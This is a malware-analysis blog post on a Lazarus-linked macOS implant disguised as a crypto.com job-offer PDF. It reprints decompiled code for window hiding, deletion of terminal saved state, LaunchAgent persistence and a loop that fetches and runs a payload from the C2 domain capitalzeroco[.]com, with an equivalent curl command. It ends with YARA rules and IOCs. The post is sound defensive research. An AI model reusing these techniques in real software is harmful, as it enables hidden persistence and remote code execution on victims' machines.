---
title: "Crypto Workers Wanted"
date: 2023-05-13T17:51:24-05:00
description: "An analysis of a multi-stage macOS implant which shares a large number of commonalities with Lazarus' Operation Interception."
summary: "An analysis of a multi-stage macOS implant which shares a large number of commonalities with Lazarus' Operation Interception."
draft: false
tags: ["Lazarus", "Malware", "RE", "CTI", "North Korea", "macOS"]
---

## 0. Summary
This post is an analysis of a previously unreported macOS implant which appears to be part of Lazarus' "Operation In(ter)ception" that was [analyzed by SentinelOne](https://www.sentinelone.com/blog/lazarus-operation-interception-targets-macos-users-dreaming-of-jobs-in-crypto/) in September 2022. This particular sample was uploaded to [VirusTotal](https://www.virustotal.com/gui/file/8762bd7e0facf8cbfa0e8710d7f2a417d43d946d22b0d7eecb3942569ce57fc0/relations) on Janurary 26, 2023 and has a number of similarites to the previously analyzed example.

This follows several high profile and prominent campaigns by North Korean actors involving the macOS platform. The most notable being the [3CX supply-chain](https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise) attack, which was found to have a macOS component (Partick Wardle did a fantastic [analysis](https://objective-see.org/blog/blog_0x73.html)). JAMF also recently reported on some new Mac malware called [RustBucket](https://www.jamf.com/blog/bluenoroff-apt-targets-macos-rustbucket-malware/), which is also attributed to North Korean threat actors.

This malware is delivered under the guise of a crypto.com job posting and has at least 3 stages. It establishes persistence using a LaunchDaemon and is capable of downloading and running further malware from a C2 server. 

All of the decompiled code, YARA rules, and Binary Ninja databases can be found on my [Github](https://github.com/ald3ns).

## 1. First Stage
| Trait   | Value                                                            |
| ------- | ---------------------------------------------------------------- |
| Name    | CryptoComJD.zip                                                  |
| MD5     | f764c707500e7a54db9830741d3a36bf                                 |
| SHA-1   | f2edce988fda14e3c113eb1ef020e8a7f15e371d                         |
| SHA-256 | a34ac35a302ceedcb86301cc1a22caeaf6a48a15b699ed20a02b5c705d6741ec |

The malware was delivered in a file called `CryptoComJD.zip` - the distribution method is unknown at this time. The PDF included in the ZIP is actually part of the first stage executable and is opened during runtime. It is 25 pages long and contains a number of crypto related job descriptions. It is the same lure that was used in the Operation In(ter)ception report.
![lure-pdf.png](img/lure-pdf.png "Fig 1: PDF Job Lure")

## 2. Second Stage
| Trait | Value                                    |
| ----- | ---------------------------------------- |
| Name  | CryptoComJobOpportunities.pdf            |
| MD5   | d1c064a698dc3b3414313d9f9e33b73b         |
| SHA-1 | 331f11417b11350aef9705791ff765d232f816bf |
| SHA-256      | 8762bd7e0facf8cbfa0e8710d7f2a417d43d946d22b0d7eecb3942569ce57fc0                                         |
### 2.1 - Preliminary Analysis

Despite the name, this file is a Mach-O universal binary, which means both arm64 and x86 versions are contained in a single executable.

```bash
➜  stage1 file sample-fat-file
sample-fat-file: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit executable x86_64] [arm64:Mach-O 64-bit executable arm64]
sample-fat-file (for architecture x86_64):	Mach-O 64-bit executable x86_64
sample-fat-file (for architecture arm64):	Mach-O 64-bit executable arm64
```

In order to more easily examine this, we can use the tool `lipo` to extract the build for a particular architecture:

```bash 
➜  stage1 lipo sample-fat-file -thin arm64 -output stage1-arm
```

After binwalking extracted file we can see some other interesting things, particularly that there is a `.app` archive and another Mach-O included.

```bash 
➜  stage1 binwalk stage1-arm
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
1276          0x4FC           Unix path: /usr/lib/dyld
33032         0x8108          gzip compressed data, from Unix, last modified: 2022-09-22 01:02:02
45151         0xB05F          PDF document, version: "1.5"
46188         0xB46C          JPEG image data, JFIF standard 1.01
48916         0xBF14          Zlib compressed data, default compression
50863         0xC6AF          JPEG image data, JFIF standard 1.01
72205         0x11A0D         Zlib compressed data, default compression
... ommited extra Zlip entires
706365        0xAC73D         Zlib compressed data, default compression
710555        0xAD79B         gzip compressed data, from Unix, last modified: 2022-09-22 00:47:49
757096        0xB8D68         XML document, version: "1.0"
779039        0xBE31F         XML document, version: "1.0"
```
### 2.2 - Static Analysis

Now that we have a standalone executable, we can start with static analysis. Opening up the `stage1-arm` file in Binary Ninja, we can see that the sample is not stripped (slay). 

Function list: 
| Address     | Name                                            |
| ----------- | ----------------------------------------------- |
| 0x100002c6c | int64_t ExecuteFile(int64_t arg1) |
| 0x100002cd0 | int64_t popen2(int64_t arg1, int32_t* arg2, int32_t* arg3) |
| 0x100002e08 | int64_t pclose2(int64_t arg1) |
| 0x100002e10 | int64_t Shell(int64_t arg1, int64_t arg2) |
| 0x100002f8c | void strreverse(char* arg1, int64_t arg2) |
| 0x100002fbc | void itoa(int64_t arg1, char* arg2, int32_t arg3) |
| 0x100003054 | int64_t startDaemon() |
| 0x1000032cc | int64_t IsSafariFAExist() |
| 0x100003358 | int64_t thExec() |
| 0x100003790 | char* GetUserName() |
| 0x100003838 | int64_t _main() |

#### 2.2.1 - Main
The actual main function is pretty long, not because it is complex but because there is a ton of string construction going on. This is because the executable makes frequent use of bash/zsh commands through a helper method called `Shell()`. Main starts off by attempting to hide these commands by running a few `printf` statements to modify the shell window:
```c
_printf("\x1b[3J"); // clears the entire screen and deletes all lines saved in the scrollback buffer
_printf("\x1b[8;1;1t"); // resize the terminal window to 1x1
_printf("\x1b[2t"); // minimize the window
Shell("printf '\x1b[8;1;1t' && printf \'\x1b[2t\'", 0); // use shell helper to again resize the window and minimize
```

Next, a few strings are built using a series of `strcats` and `strcpys`.
1. a filepath: 
```bash
/Users/{username}/Library/DiagnosticsPeer/CryptoComJobOpportunities.pdf
```
2. a bash command:
```bash
open \'{filepath}\' && rm -rf \'/Users/{username}/Library/Saved Application State/com.apple.Terminal.savedState\'
```

The embedded PDF file is written to the location above and the bash command is executed. The bash command opens the PDF and deletes the terminal history. This gives the impression that the double-clicked file is actually a PDF and not an executable.

```c
FILE *filepath_fp = _open(&filepath, 0x201);
if (filepath_fp == 0) {
    _write();
    _close(filepath_fp);
    Shell(&command, 0);
    ...
```

 Finally, `thExec()` and then a check against the killswitch are called. If the next stage is already found to be running, execution will stop.
```c
    //cont...
    thExec();
    if (IsSafariFAExist() == 1) {
        _g_d = 1;
    }
    Shell("killall Terminal", 0);
}
```

#### 2.2.2 - Killswitch
The function `IsSafariFAExist()` is a killswitch to prevent installation if the next stage is already running on the host. It uses the `Shell()` helper function to execute `pgrep` which searches for the running process *diageventagent*. This function is checked a few times in: main, thExec, and startDaemon. The behavior of exiting if the function returns true is consistent.
```c
int int_conv_of_pgrep_output;
int return_val;
char* outcome_of_pgrep;

memset(outcome_of_pgrep, 0, 0x64);
Shell("pgrep -f diageventagent", &outcome_of_pgrep);

if (outcome_of_pgrep != 0) {
    int_conv_of_pgrep_output = _atoi(&outcome_of_pgrep);
    if (int_conv_of_pgrep_output > 0) {
        return_val = 1;
    }
}

if (((outcome_of_pgrep == 0) || (outcome_of_pgrep != 0 && int_conv_of_pgrep_output <= 0)) {
    return_val = 0;
}

return return_val;
```

#### 2.2.3 - `thExec()`
This function is responsible for writing the included `.app` archive and subsequent executables to dist as well as triggering the persistence mechanism. Just like main it makes heavy use of `Shell()` and most of it's length comes from the tedious tedious string building. 

There are 5 main strings built: 
1. A source path: `/Users/{username}/Library/DiagnosticsPeer/diageventagent_`
2. A destination path: `/Users/{username}/Library/DiagnosticsPeer/diageventagent`
3. A temp path: `/Users/{username}/Library/DiagnosticsPeer/diagevent_` 
4. Command 1:`tar zxvf \'{temp}\' -C \'{dest}\'`
5. Command 2: `open -a \'{dest}/diageventd.app\'`

The core logic of this function is quite short and centers around checking against the killswitch before triggering the persistence mechanism.
```c
if (IsSafariFAExist() == 1) {
    Shell("killall Terminal", 0);
}
else {
    if (IsSafariFAExist() == 0) {
        int32_t x0_45; // killswitch status
        do {
            Shell(&command2, 0);
            startDaemon();
            _sleep(1);
            _g_c = 1; // global state variable
            x0_45 = IsSafariFAExist();
        } while (x0_45 == 0);
    }
    if (_access(&dest, 0) != 0xffffffff) {
        _g_e = 1; // global state variable
    }
}
```
#### 2.2.4 - Persistence
The `startDaemon()` function is how this malware establishes persistence. It does so through a LaunchAgent daemon called "iTunes_trush" (banger playlist name). 

The general flow of this function is: 
1. Create directory in `/Users/{username}/Library/LaunchAgents/`
2. Create plist file in `/Users/{username}/Library/LaunchAgents/com.diagnosticspeer.plist`
3. Create filepath string for second stage executable: `/Users/{username}/Library/DiagnosticsPeer/diageventagent`
4. Write second stage executable.

The following is the contents of the written plist file. It is setup so that launchd will runs the executable `diageventagent` at system boot.
```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>Label</key>
			<string>iTunes_trush</string>
		<key>OnDemand</key>
			<true/>
		<key>ProgramArguments</key>
		<array>
			<string>/Users/{username}/Library/DiagnosticsPeer/diageventagent</string>
		</array>
		<key>RunAtLoad</key>
			<true/>
		<key>KeepAlive</key>
			<true/>
	</dict>
</plist>
```


## 3. Third Stage
| Trait | Value                                    |
| ----- | ---------------------------------------- |
| Name  | diageventagent                           |
| MD5   | edc8136611b90ea492830adde099b1a6         |
| SHA-1 | 1104a10689f4887ea9bba47fe3e115e271414fbe |
| SHA-256      | fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7                                         |

### 3.1 - Preliminary Analysis

Again, this file is a Mach-O universal binary so we repeat the process of extracting a particular build for the purposes of analysis. I chose the ARM version for consistency.

```bash
➜  stage2 file fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7
fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit executable x86_64] [arm64:Mach-O 64-bit executable arm64]
fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 (for architecture x86_64):	Mach-O 64-bit executable x86_64
fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 (for architecture arm64):	Mach-O 64-bit executable arm64
➜  stage2 lipo fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 -thin arm64 -output stage2-arm-sample
```

### 3.2 - Static Analysis
After opening up this file in Binja we can see that it is also not stripped and shares a number of similarities with the previous stage.

**Function list**:
| Address     | Name                                                       |
| ----------- | ---------------------------------------------------------- |
| 0x100002c3c | int64_t ExecuteFile(int64_t arg1)                          |
| 0x100002c90 | int64_t popen2(int64_t arg1, int32_t* arg2, int32_t* arg3) |
| 0x100002dc8 | int64_t pclose2(int64_t arg1)                              |
| 0x100002dd0 | int64_t Shell()                                            |
| 0x100002f58 | int64_t write_data()                                       |
| 0x100002f5c | int64_t DownloadFile()                                     |
| 0x10000367c | void strreverse(char* arg1, int64_t arg2)                  |
| 0x1000036ac | void itoa(int64_t arg1, char* arg2, int32_t arg3)          |
| 0x100003744 | int64_t cp()                                               |
| 0x1000038d0 | int64_t _main()                                            |


#### 3.2.1 - Main
**Shocker** this main also is mostly just string building. This stage also preodically checks in with the C2 server to try and download a payload located at `https[:]//capitalzeroco.com/{user's UID}.png`. If the file is found, it would be written to `/Users/{username}/"/Library/DiagnosticsPeer/AppStore`.

It then drops into the following infinite loop:

```c
while (true)
    x0_10 = DownloadFile()
    if (x0_10 != 0)
        break
    _sleep(0x4b0)
if (x0_10 == 1)
    ExecuteFile(&filepath)
while (true)
    _sleep(0x4b0)
```

#### 3.2.2 - Download File

Then `libcurl` to build a curl command that would be equivalent to:
```bash
curl -X GET "https[:]//capitalzeroco[.]com?response=<response_data>" \
     -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" \
     -H "Content-Encoding: application/x-www-form-urlencoded; charset=UTF-8"
```

If there is a successful download, it would try to perform the following command using the `Shell()` helper:

```bash
tar zxvf \'{}\' -C \'{new file}\'"
```

## 4. Infrastructure Analysis
The C2 domain in this sample is capitalzeroco[.]com and currently points to the domain 172[.]93[.]201[.]106. It is currently running Microsoft IIS and has RDP exposed. This means that this host is most likely a compromised asset making pivoting off this particular infra difficult.

The domain was registered on Porkbun which is a favorite of 

## 5. Appendix

### 5.1 - YARA Rules

```yaml
rule operation_intercept_macos_stage1 {
   meta:
      description = "Detecting persistence of macOS persistence Lazarus"
      author = "@birchb0y"
      reference = ""
      date = "2023-13-05"
		
	strings:
      $persist1 = "com.diagnosticspeer.plist"
      $persist2 = "DiagnosticsPeer"
      $persist3 = "pgrep -f diageventagent"
      $persist4 = "diageventagent_"
      $persist5 = "diagevent_"
      $persist6 = "diageventagent"
      $persist7 = "diageventd.app"

      $plist1 = "iTunes_trush"
      $plist2 = "OnDemand"
      $plist3 = "RunAtLoad"
      $plist4 = "KeepAlive"

	condition:
      any of ($persist*) or all of ($plist*)
}  

rule operation_intercept_stage2 {
   meta:
      description = ""
      author = "@birchb0y"
      reference = ""
      date = "2023-13-05"

	strings:
      $string1 = "DiagnosticsPeer"
      $string2 = "capitalzeroco.com"

      $curl1 = "Mozilla/5.0+(Macintosh;Intel+Mac+OS+X+12_4)+AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
      $curl2 = "Content-Encoding: application/x-www-form-urlencoded; charset=UTF-8"

	condition:
      any of ($string*) or all of ($curl*)
}
```

### 5.2 - IOCs

**Files** 
| Name                          | SHA-256                                                          |
| ----------------------------- | ---------------------------------------------------------------- |
| CryptoComJobOpportunities.pdf | 8762bd7e0facf8cbfa0e8710d7f2a417d43d946d22b0d7eecb3942569ce57fc0 |
| diageventagent                | fa1f3254537c9841a62dfee080874d6792186670a0cb59dbc25dda7ca718a3a7 |
| CryptoComJD.zip                              | a34ac35a302ceedcb86301cc1a22caeaf6a48a15b699ed20a02b5c705d6741ec                                                                 |

**Infrastructure**
| Domain              | IP                   |
| ------------------- | -------------------- |
| capitalzeroco[.]com | 172[.]93[.]201[.]106 |
